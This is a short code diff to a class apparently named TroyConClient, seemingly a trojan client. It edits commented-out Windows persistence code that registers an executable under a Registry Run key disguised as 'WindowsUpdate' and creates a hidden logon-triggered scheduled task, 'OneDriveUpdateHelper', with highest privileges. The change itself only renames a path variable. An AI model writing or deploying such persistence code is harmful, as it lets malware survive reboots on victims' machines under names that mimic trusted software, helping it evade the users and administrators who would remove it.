@@ -183,7 +183,7 @@ class TroyConClient:
                 # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
                 # key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                 # key_handle = CreateKey(HKEY_CURRENT_USER, key_path)
-                # SetValueEx(key_handle, "WindowsUpdate", 0, REG_SZ, persistence_target_path)
+                # SetValueEx(key_handle, "WindowsUpdate", 0, REG_SZ, exe_path)
                 # print("Registry Run key registration complete")
 
                 # Register to Task Scheduler
@@ -191,7 +191,7 @@ class TroyConClient:
                 # Trigger: /sc onlogon (Runs every time the user logs in)
                 # Force: /f (Overwrite if exists)
                 # task_name = "OneDriveUpdateHelper"
-                # cmd = f'schtasks /create /tn "{task_name}" /tr "{persistence_target_path}" /sc onlogon /rl HIGHEST /f'
+                # cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl HIGHEST /f'
                 
                 # Execute command in the background without a console window
                 # subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
